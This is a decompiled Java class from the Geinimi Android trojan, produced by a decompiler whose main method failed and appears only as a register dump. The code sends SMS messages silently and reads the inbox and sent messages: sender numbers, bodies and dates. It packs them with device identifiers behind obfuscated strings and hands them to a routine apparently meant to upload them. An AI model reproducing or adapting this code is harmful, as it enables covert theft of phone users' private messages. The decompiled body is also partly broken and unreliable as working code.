package com.geinimi.c;

import android.app.PendingIntent;
import android.content.Intent;
import android.telephony.SmsManager;

public final class i {
    public static void a(String str, String str2) {
        SmsManager.getDefault().sendTextMessage(str, null, str2, PendingIntent.getActivity(k.a(), 0, new Intent(k.a(), k.a().getClass()), 0), null);
    }

    /* JADX WARNING: Removed duplicated region for block: B:18:0x0096 A[Catch:{ Exception -> 0x028d }] */
    /* JADX WARNING: Removed duplicated region for block: B:24:0x00e3  */
    /* JADX WARNING: Removed duplicated region for block: B:50:0x02bf A[Catch:{ Exception -> 0x04ac }] */
    /* JADX WARNING: Removed duplicated region for block: B:56:0x030c  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static boolean a(java.lang.String r19, java.lang.String r20, java.lang.String r21) {
        /*
            java.lang.String r8 = com.geinimi.c.k.f
            r2 = 0
            r3 = 0
            r5 = 0
            if (r8 != 0) goto L_0x000a
            r19 = 0
        L_0x0009:
            return r19
        L_0x000a:
            r4 = 5
            java.lang.String[] r4 = new java.lang.String[r4]
            r6 = 0
            java.lang.String r7 = "_id"
            r4[r6] = r7
            r6 = 1
            java.lang.String r7 = "address"
            r4[r6] = r7
            r6 = 2
            java.lang.String r7 = "person"
            r4[r6] = r7
            r6 = 3
            java.lang.String r7 = "body"
            r4[r6] = r7
            r6 = 4
            java.lang.String r7 = "date"
            r4[r6] = r7
            java.lang.StringBuilder r6 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x028d }
            r6.<init>()     // Catch:{ Exception -> 0x028d }
            java.lang.String r7 = ".........sDate="
            java.lang.StringBuilder r6 = r6.append(r7)     // Catch:{ Exception -> 0x028d }
            r0 = r6
            r1 = r20
            java.lang.StringBuilder r6 = r0.append(r1)     // Catch:{ Exception -> 0x028d }
            java.lang.String r7 = ",eDate="
            java.lang.StringBuilder r6 = r6.append(r7)     // Catch:{ Exception -> 0x028d }
            r0 = r6
            r1 = r21
            java.lang.StringBuilder r6 = r0.append(r1)     // Catch:{ Exception -> 0x028d }
            r6.toString()     // Catch:{ Exception -> 0x028d }
            if (r20 == 0) goto L_0x04be
            if (r21 == 0) goto L_0x04be
            java.text.SimpleDateFormat r6 = new java.text.SimpleDateFormat     // Catch:{ ParseException -> 0x022b }
            java.lang.String r7 = "yyyyMMdd"
            r6.<init>(r7)     // Catch:{ ParseException -> 0x022b }
            r0 = r6
            r1 = r20
            java.util.Date r20 = r0.parse(r1)     // Catch:{ ParseException -> 0x022b }
            r0 = r6
            r1 = r21
            java.util.Date r21 = r0.parse(r1)     // Catch:{ ParseException -> 0x04bb }
            r2 = 1
            r18 = r21
            r21 = r20
            r20 = r18
        L_0x0068:
            r9 = r2
        L_0x0069:
            android.content.Context r2 = com.geinimi.c.k.a()     // Catch:{ Exception -> 0x028d }
            android.content.ContentResolver r2 = r2.getContentResolver()     // Catch:{ Exception -> 0x028d }
            r3 = 39
            java.lang.String r3 = com.geinimi.c.m.a(r3)     // Catch:{ Exception -> 0x028d }
            android.net.Uri r3 = android.net.Uri.parse(r3)     // Catch:{ Exception -> 0x028d }
            r5 = 0
            r6 = 0
            java.lang.String r7 = "date desc"
            android.database.Cursor r2 = r2.query(r3, r4, r5, r6, r7)     // Catch:{ Exception -> 0x028d }
            int r3 = r2.getCount()     // Catch:{ Exception -> 0x028d }
            java.lang.String[] r5 = new java.lang.String[r3]     // Catch:{ Exception -> 0x028d }
            java.lang.String[] r6 = new java.lang.String[r3]     // Catch:{ Exception -> 0x028d }
            java.lang.String[] r7 = new java.lang.String[r3]     // Catch:{ Exception -> 0x028d }
            long[] r10 = new long[r3]     // Catch:{ Exception -> 0x028d }
            r11 = 0
            boolean r12 = r2.moveToFirst()     // Catch:{ Exception -> 0x028d }
            if (r12 == 0) goto L_0x00ce
            java.lang.String r12 = "person"
            int r12 = r2.getColumnIndex(r12)     // Catch:{ Exception -> 0x028d }
            java.lang.String r13 = "address"
            int r13 = r2.getColumnIndex(r13)     // Catch:{ Exception -> 0x028d }
            java.lang.String r14 = "body"
            int r14 = r2.getColumnIndex(r14)     // Catch:{ Exception -> 0x028d }
            java.lang.String r15 = "date"
            int r15 = r2.getColumnIndex(r15)     // Catch:{ Exception -> 0x028d }
        L_0x00ae:
            java.lang.String r16 = r2.getString(r12)     // Catch:{ Exception -> 0x028d }
            r5[r11] = r16     // Catch:{ Exception -> 0x028d }
            java.lang.String r16 = r2.getString(r13)     // Catch:{ Exception -> 0x028d }
            r6[r11] = r16     // Catch:{ Exception -> 0x028d }
            java.lang.String r16 = r2.getString(r14)     // Catch:{ Exception -> 0x028d }
            r7[r11] = r16     // Catch:{ Exception -> 0x028d }
            long r16 = r2.getLong(r15)     // Catch:{ Exception -> 0x028d }
            r10[r11] = r16     // Catch:{ Exception -> 0x028d }
            int r11 = r11 + 1
            boolean r16 = r2.moveToNext()     // Catch:{ Exception -> 0x028d }
            if (r16 != 0) goto L_0x00ae
        L_0x00ce:
            java.lang.StringBuffer r2 = new java.lang.StringBuffer     // Catch:{ Exception -> 0x028d }
            r2.<init>()     // Catch:{ Exception -> 0x028d }
            r5 = 0
            java.text.SimpleDateFormat r11 = new java.text.SimpleDateFormat     // Catch:{ Exception -> 0x028d }
            java.lang.String r12 = "yyyy-MM-dd kk:mm:ss"
            r11.<init>(r12)     // Catch:{ Exception -> 0x028d }
            r12 = 0
            r18 = r12
            r12 = r2
            r2 = r18
        L_0x00e1:
            if (r2 >= r3) goto L_0x0292
            if (r9 == 0) goto L_0x0235
            java.lang.String r13 = "yyyy-MM-dd kk:mm:ss"
            r14 = r10[r2]     // Catch:{ ParseException -> 0x04b8 }
            java.lang.CharSequence r13 = android.text.format.DateFormat.format(r13, r14)     // Catch:{ ParseException -> 0x04b8 }
            java.lang.String r13 = r13.toString()     // Catch:{ ParseException -> 0x04b8 }
            java.util.Date r13 = r11.parse(r13)     // Catch:{ ParseException -> 0x04b8 }
            r0 = r21
            r1 = r13
            boolean r14 = r0.before(r1)     // Catch:{ ParseException -> 0x04b8 }
            if (r14 == 0) goto L_0x015d
            r0 = r20
            r1 = r13
            boolean r13 = r0.after(r1)     // Catch:{ ParseException -> 0x04b8 }
            if (r13 == 0) goto L_0x015d
            int r5 = r5 + 1
            java.lang.StringBuilder r13 = new java.lang.StringBuilder     // Catch:{ ParseException -> 0x04b8 }
            r13.<init>()     // Catch:{ ParseException -> 0x04b8 }
            java.lang.String r14 = "yyyy-MM-dd kk:mm:ss"
            r15 = r10[r2]     // Catch:{ ParseException -> 0x04b8 }
            java.lang.CharSequence r14 = android.text.format.DateFormat.format(r14, r15)     // Catch:{ ParseException -> 0x04b8 }
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ ParseException -> 0x04b8 }
            java.lang.String r14 = "@time@"
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ ParseException -> 0x04b8 }
            java.lang.String r13 = r13.toString()     // Catch:{ ParseException -> 0x04b8 }
            r12.append(r13)     // Catch:{ ParseException -> 0x04b8 }
            java.lang.StringBuilder r13 = new java.lang.StringBuilder     // Catch:{ ParseException -> 0x04b8 }
            r13.<init>()     // Catch:{ ParseException -> 0x04b8 }
            java.lang.String r14 = ""
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ ParseException -> 0x04b8 }
            r14 = r6[r2]     // Catch:{ ParseException -> 0x04b8 }
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ ParseException -> 0x04b8 }
            java.lang.String r14 = "@num@"
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ ParseException -> 0x04b8 }
            java.lang.String r13 = r13.toString()     // Catch:{ ParseException -> 0x04b8 }
            r12.append(r13)     // Catch:{ ParseException -> 0x04b8 }
            java.lang.StringBuilder r13 = new java.lang.StringBuilder     // Catch:{ ParseException -> 0x04b8 }
            r13.<init>()     // Catch:{ ParseException -> 0x04b8 }
            r14 = r7[r2]     // Catch:{ ParseException -> 0x04b8 }
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ ParseException -> 0x04b8 }
            java.lang.String r14 = "@end@\n"
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ ParseException -> 0x04b8 }
            java.lang.String r13 = r13.toString()     // Catch:{ ParseException -> 0x04b8 }
            r12.append(r13)     // Catch:{ ParseException -> 0x04b8 }
        L_0x015d:
            int r13 = r5 + 1
            int r13 = r13 % 10
            if (r13 == 0) goto L_0x0168
            r13 = 1
            int r13 = r3 - r13
            if (r2 != r13) goto L_0x0227
        L_0x0168:
            java.lang.String r12 = r12.toString()     // Catch:{ Exception -> 0x028d }
            java.lang.String r12 = java.net.URLEncoder.encode(r12)     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuffer r13 = new java.lang.StringBuffer     // Catch:{ Exception -> 0x028d }
            r13.<init>()     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r14 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x028d }
            r14.<init>()     // Catch:{ Exception -> 0x028d }
            r15 = 49
            java.lang.String r15 = com.geinimi.c.m.a(r15)     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r14 = r14.append(r15)     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r14 = r14.append(r8)     // Catch:{ Exception -> 0x028d }
            r15 = 50
            java.lang.String r15 = com.geinimi.c.m.a(r15)     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r14 = r14.append(r15)     // Catch:{ Exception -> 0x028d }
            java.lang.String r15 = com.geinimi.c.k.s     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r14 = r14.append(r15)     // Catch:{ Exception -> 0x028d }
            r15 = 45
            java.lang.String r15 = com.geinimi.c.m.a(r15)     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r14 = r14.append(r15)     // Catch:{ Exception -> 0x028d }
            java.lang.String r15 = com.geinimi.c.k.b()     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r14 = r14.append(r15)     // Catch:{ Exception -> 0x028d }
            r15 = 46
            java.lang.String r15 = com.geinimi.c.m.a(r15)     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r14 = r14.append(r15)     // Catch:{ Exception -> 0x028d }
            java.lang.String r15 = com.geinimi.c.k.c()     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r14 = r14.append(r15)     // Catch:{ Exception -> 0x028d }
            r15 = 47
            java.lang.String r15 = com.geinimi.c.m.a(r15)     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r14 = r14.append(r15)     // Catch:{ Exception -> 0x028d }
            java.lang.String r15 = com.geinimi.c.k.d()     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r14 = r14.append(r15)     // Catch:{ Exception -> 0x028d }
            r15 = 67
            java.lang.String r15 = com.geinimi.c.m.a(r15)     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r14 = r14.append(r15)     // Catch:{ Exception -> 0x028d }
            java.lang.String r15 = com.geinimi.c.k.e()     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r14 = r14.append(r15)     // Catch:{ Exception -> 0x028d }
            r15 = 68
            java.lang.String r15 = com.geinimi.c.m.a(r15)     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r14 = r14.append(r15)     // Catch:{ Exception -> 0x028d }
            java.lang.String r15 = com.geinimi.c.k.f()     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r14 = r14.append(r15)     // Catch:{ Exception -> 0x028d }
            r15 = 69
            java.lang.String r15 = com.geinimi.c.m.a(r15)     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r14 = r14.append(r15)     // Catch:{ Exception -> 0x028d }
            java.lang.String r15 = com.geinimi.c.k.g()     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r14 = r14.append(r15)     // Catch:{ Exception -> 0x028d }
            r15 = 51
            java.lang.String r15 = com.geinimi.c.m.a(r15)     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r14 = r14.append(r15)     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r12 = r14.append(r12)     // Catch:{ Exception -> 0x028d }
            r14 = 55
            java.lang.String r14 = com.geinimi.c.m.a(r14)     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r12 = r12.append(r14)     // Catch:{ Exception -> 0x028d }
            java.lang.String r12 = r12.toString()     // Catch:{ Exception -> 0x028d }
            r0 = r19
            r1 = r12
            com.geinimi.c.l.a(r0, r1)     // Catch:{ Exception -> 0x028d }
            r12 = r13
        L_0x0227:
            int r2 = r2 + 1
            goto L_0x00e1
        L_0x022b:
            r20 = move-exception
            r20 = r3
        L_0x022e:
            r21 = r20
            r9 = r2
            r20 = r5
            goto L_0x0069
        L_0x0235:
            java.lang.StringBuilder r13 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x028d }
            r13.<init>()     // Catch:{ Exception -> 0x028d }
            java.lang.String r14 = "yyyy-MM-dd kk:mm:ss"
            r15 = r10[r2]     // Catch:{ Exception -> 0x028d }
            java.lang.CharSequence r14 = android.text.format.DateFormat.format(r14, r15)     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ Exception -> 0x028d }
            java.lang.String r14 = "@time@"
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ Exception -> 0x028d }
            java.lang.String r13 = r13.toString()     // Catch:{ Exception -> 0x028d }
            r12.append(r13)     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r13 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x028d }
            r13.<init>()     // Catch:{ Exception -> 0x028d }
            java.lang.String r14 = ""
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ Exception -> 0x028d }
            r14 = r6[r2]     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ Exception -> 0x028d }
            java.lang.String r14 = "@num@"
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ Exception -> 0x028d }
            java.lang.String r13 = r13.toString()     // Catch:{ Exception -> 0x028d }
            r12.append(r13)     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r13 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x028d }
            r13.<init>()     // Catch:{ Exception -> 0x028d }
            r14 = r7[r2]     // Catch:{ Exception -> 0x028d }
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ Exception -> 0x028d }
            java.lang.String r14 = "@end@\n"
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ Exception -> 0x028d }
            java.lang.String r13 = r13.toString()     // Catch:{ Exception -> 0x028d }
            r12.append(r13)     // Catch:{ Exception -> 0x028d }
            int r5 = r5 + 1
            goto L_0x015d
        L_0x028d:
            r19 = move-exception
            r19 = 0
            goto L_0x0009
        L_0x0292:
            android.content.Context r2 = com.geinimi.c.k.a()     // Catch:{ Exception -> 0x04ac }
            android.content.ContentResolver r2 = r2.getContentResolver()     // Catch:{ Exception -> 0x04ac }
            r3 = 40
            java.lang.String r3 = com.geinimi.c.m.a(r3)     // Catch:{ Exception -> 0x04ac }
            android.net.Uri r3 = android.net.Uri.parse(r3)     // Catch:{ Exception -> 0x04ac }
            r5 = 0
            r6 = 0
            java.lang.String r7 = "date desc"
            android.database.Cursor r2 = r2.query(r3, r4, r5, r6, r7)     // Catch:{ Exception -> 0x04ac }
            int r3 = r2.getCount()     // Catch:{ Exception -> 0x04ac }
            java.lang.String[] r4 = new java.lang.String[r3]     // Catch:{ Exception -> 0x04ac }
            java.lang.String[] r5 = new java.lang.String[r3]     // Catch:{ Exception -> 0x04ac }
            java.lang.String[] r6 = new java.lang.String[r3]     // Catch:{ Exception -> 0x04ac }
            long[] r7 = new long[r3]     // Catch:{ Exception -> 0x04ac }
            r10 = 0
            boolean r11 = r2.moveToFirst()     // Catch:{ Exception -> 0x04ac }
            if (r11 == 0) goto L_0x02f7
            java.lang.String r11 = "person"
            int r11 = r2.getColumnIndex(r11)     // Catch:{ Exception -> 0x04ac }
            java.lang.String r12 = "address"
            int r12 = r2.getColumnIndex(r12)     // Catch:{ Exception -> 0x04ac }
            java.lang.String r13 = "body"
            int r13 = r2.getColumnIndex(r13)     // Catch:{ Exception -> 0x04ac }
            java.lang.String r14 = "date"
            int r14 = r2.getColumnIndex(r14)     // Catch:{ Exception -> 0x04ac }
        L_0x02d7:
            java.lang.String r15 = r2.getString(r11)     // Catch:{ Exception -> 0x04ac }
            r4[r10] = r15     // Catch:{ Exception -> 0x04ac }
            java.lang.String r15 = r2.getString(r12)     // Catch:{ Exception -> 0x04ac }
            r5[r10] = r15     // Catch:{ Exception -> 0x04ac }
            java.lang.String r15 = r2.getString(r13)     // Catch:{ Exception -> 0x04ac }
            r6[r10] = r15     // Catch:{ Exception -> 0x04ac }
            long r15 = r2.getLong(r14)     // Catch:{ Exception -> 0x04ac }
            r7[r10] = r15     // Catch:{ Exception -> 0x04ac }
            int r10 = r10 + 1
            boolean r15 = r2.moveToNext()     // Catch:{ Exception -> 0x04ac }
            if (r15 != 0) goto L_0x02d7
        L_0x02f7:
            java.lang.StringBuffer r2 = new java.lang.StringBuffer     // Catch:{ Exception -> 0x04ac }
            r2.<init>()     // Catch:{ Exception -> 0x04ac }
            r4 = 0
            java.text.SimpleDateFormat r10 = new java.text.SimpleDateFormat     // Catch:{ Exception -> 0x04ac }
            java.lang.String r11 = "yyyy-MM-dd kk:mm:ss"
            r10.<init>(r11)     // Catch:{ Exception -> 0x04ac }
            r11 = 0
            r18 = r11
            r11 = r2
            r2 = r18
        L_0x030a:
            if (r2 >= r3) goto L_0x04b1
            if (r9 == 0) goto L_0x0454
            java.lang.String r12 = "yyyy-MM-dd kk:mm:ss"
            r13 = r7[r2]     // Catch:{ ParseException -> 0x04b5 }
            java.lang.CharSequence r12 = android.text.format.DateFormat.format(r12, r13)     // Catch:{ ParseException -> 0x04b5 }
            java.lang.String r12 = r12.toString()     // Catch:{ ParseException -> 0x04b5 }
            java.util.Date r12 = r10.parse(r12)     // Catch:{ ParseException -> 0x04b5 }
            r0 = r21
            r1 = r12
            boolean r13 = r0.before(r1)     // Catch:{ ParseException -> 0x04b5 }
            if (r13 == 0) goto L_0x0386
            r0 = r20
            r1 = r12
            boolean r12 = r0.after(r1)     // Catch:{ ParseException -> 0x04b5 }
            if (r12 == 0) goto L_0x0386
            int r4 = r4 + 1
            java.lang.StringBuilder r12 = new java.lang.StringBuilder     // Catch:{ ParseException -> 0x04b5 }
            r12.<init>()     // Catch:{ ParseException -> 0x04b5 }
            java.lang.String r13 = "yyyy-MM-dd kk:mm:ss"
            r14 = r7[r2]     // Catch:{ ParseException -> 0x04b5 }
            java.lang.CharSequence r13 = android.text.format.DateFormat.format(r13, r14)     // Catch:{ ParseException -> 0x04b5 }
            java.lang.StringBuilder r12 = r12.append(r13)     // Catch:{ ParseException -> 0x04b5 }
            java.lang.String r13 = "@time@"
            java.lang.StringBuilder r12 = r12.append(r13)     // Catch:{ ParseException -> 0x04b5 }
            java.lang.String r12 = r12.toString()     // Catch:{ ParseException -> 0x04b5 }
            r11.append(r12)     // Catch:{ ParseException -> 0x04b5 }
            java.lang.StringBuilder r12 = new java.lang.StringBuilder     // Catch:{ ParseException -> 0x04b5 }
            r12.<init>()     // Catch:{ ParseException -> 0x04b5 }
            java.lang.String r13 = ""
            java.lang.StringBuilder r12 = r12.append(r13)     // Catch:{ ParseException -> 0x04b5 }
            r13 = r5[r2]     // Catch:{ ParseException -> 0x04b5 }
            java.lang.StringBuilder r12 = r12.append(r13)     // Catch:{ ParseException -> 0x04b5 }
            java.lang.String r13 = "@num@"
            java.lang.StringBuilder r12 = r12.append(r13)     // Catch:{ ParseException -> 0x04b5 }
            java.lang.String r12 = r12.toString()     // Catch:{ ParseException -> 0x04b5 }
            r11.append(r12)     // Catch:{ ParseException -> 0x04b5 }
            java.lang.StringBuilder r12 = new java.lang.StringBuilder     // Catch:{ ParseException -> 0x04b5 }
            r12.<init>()     // Catch:{ ParseException -> 0x04b5 }
            r13 = r6[r2]     // Catch:{ ParseException -> 0x04b5 }
            java.lang.StringBuilder r12 = r12.append(r13)     // Catch:{ ParseException -> 0x04b5 }
            java.lang.String r13 = "@end@\n"
            java.lang.StringBuilder r12 = r12.append(r13)     // Catch:{ ParseException -> 0x04b5 }
            java.lang.String r12 = r12.toString()     // Catch:{ ParseException -> 0x04b5 }
            r11.append(r12)     // Catch:{ ParseException -> 0x04b5 }
        L_0x0386:
            int r12 = r4 + 1
            int r12 = r12 % 10
            if (r12 == 0) goto L_0x0391
            r12 = 1
            int r12 = r3 - r12
            if (r2 != r12) goto L_0x0450
        L_0x0391:
            java.lang.String r11 = r11.toString()     // Catch:{ Exception -> 0x04ac }
            java.lang.String r11 = java.net.URLEncoder.encode(r11)     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuffer r12 = new java.lang.StringBuffer     // Catch:{ Exception -> 0x04ac }
            r12.<init>()     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r13 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x04ac }
            r13.<init>()     // Catch:{ Exception -> 0x04ac }
            r14 = 49
            java.lang.String r14 = com.geinimi.c.m.a(r14)     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r13 = r13.append(r8)     // Catch:{ Exception -> 0x04ac }
            r14 = 50
            java.lang.String r14 = com.geinimi.c.m.a(r14)     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ Exception -> 0x04ac }
            java.lang.String r14 = com.geinimi.c.k.s     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ Exception -> 0x04ac }
            r14 = 45
            java.lang.String r14 = com.geinimi.c.m.a(r14)     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ Exception -> 0x04ac }
            java.lang.String r14 = com.geinimi.c.k.b()     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ Exception -> 0x04ac }
            r14 = 46
            java.lang.String r14 = com.geinimi.c.m.a(r14)     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ Exception -> 0x04ac }
            java.lang.String r14 = com.geinimi.c.k.c()     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ Exception -> 0x04ac }
            r14 = 47
            java.lang.String r14 = com.geinimi.c.m.a(r14)     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ Exception -> 0x04ac }
            java.lang.String r14 = com.geinimi.c.k.d()     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ Exception -> 0x04ac }
            r14 = 67
            java.lang.String r14 = com.geinimi.c.m.a(r14)     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ Exception -> 0x04ac }
            java.lang.String r14 = com.geinimi.c.k.e()     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ Exception -> 0x04ac }
            r14 = 68
            java.lang.String r14 = com.geinimi.c.m.a(r14)     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ Exception -> 0x04ac }
            java.lang.String r14 = com.geinimi.c.k.f()     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ Exception -> 0x04ac }
            r14 = 69
            java.lang.String r14 = com.geinimi.c.m.a(r14)     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ Exception -> 0x04ac }
            java.lang.String r14 = com.geinimi.c.k.g()     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ Exception -> 0x04ac }
            r14 = 51
            java.lang.String r14 = com.geinimi.c.m.a(r14)     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r13 = r13.append(r14)     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r11 = r13.append(r11)     // Catch:{ Exception -> 0x04ac }
            r13 = 52
            java.lang.String r13 = com.geinimi.c.m.a(r13)     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r11 = r11.append(r13)     // Catch:{ Exception -> 0x04ac }
            java.lang.String r11 = r11.toString()     // Catch:{ Exception -> 0x04ac }
            r0 = r19
            r1 = r11
            com.geinimi.c.l.a(r0, r1)     // Catch:{ Exception -> 0x04ac }
            r11 = r12
        L_0x0450:
            int r2 = r2 + 1
            goto L_0x030a
        L_0x0454:
            int r4 = r4 + 1
            java.lang.StringBuilder r12 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x04ac }
            r12.<init>()     // Catch:{ Exception -> 0x04ac }
            java.lang.String r13 = "yyyy-MM-dd kk:mm:ss"
            r14 = r7[r2]     // Catch:{ Exception -> 0x04ac }
            java.lang.CharSequence r13 = android.text.format.DateFormat.format(r13, r14)     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r12 = r12.append(r13)     // Catch:{ Exception -> 0x04ac }
            java.lang.String r13 = "@time@"
            java.lang.StringBuilder r12 = r12.append(r13)     // Catch:{ Exception -> 0x04ac }
            java.lang.String r12 = r12.toString()     // Catch:{ Exception -> 0x04ac }
            r11.append(r12)     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r12 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x04ac }
            r12.<init>()     // Catch:{ Exception -> 0x04ac }
            java.lang.String r13 = ""
            java.lang.StringBuilder r12 = r12.append(r13)     // Catch:{ Exception -> 0x04ac }
            r13 = r5[r2]     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r12 = r12.append(r13)     // Catch:{ Exception -> 0x04ac }
            java.lang.String r13 = "@num@"
            java.lang.StringBuilder r12 = r12.append(r13)     // Catch:{ Exception -> 0x04ac }
            java.lang.String r12 = r12.toString()     // Catch:{ Exception -> 0x04ac }
            r11.append(r12)     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r12 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x04ac }
            r12.<init>()     // Catch:{ Exception -> 0x04ac }
            r13 = r6[r2]     // Catch:{ Exception -> 0x04ac }
            java.lang.StringBuilder r12 = r12.append(r13)     // Catch:{ Exception -> 0x04ac }
            java.lang.String r13 = "@end@\n"
            java.lang.StringBuilder r12 = r12.append(r13)     // Catch:{ Exception -> 0x04ac }
            java.lang.String r12 = r12.toString()     // Catch:{ Exception -> 0x04ac }
            r11.append(r12)     // Catch:{ Exception -> 0x04ac }
            goto L_0x0386
        L_0x04ac:
            r19 = move-exception
            r19 = 0
            goto L_0x0009
        L_0x04b1:
            r19 = 1
            goto L_0x0009
        L_0x04b5:
            r12 = move-exception
            goto L_0x0386
        L_0x04b8:
            r13 = move-exception
            goto L_0x015d
        L_0x04bb:
            r21 = move-exception
            goto L_0x022e
        L_0x04be:
            r20 = r5
            r21 = r3
            goto L_0x0068
        */
        throw new UnsupportedOperationException("Method not decompiled: com.geinimi.c.i.a(java.lang.String, java.lang.String, java.lang.String):boolean");
    }
}
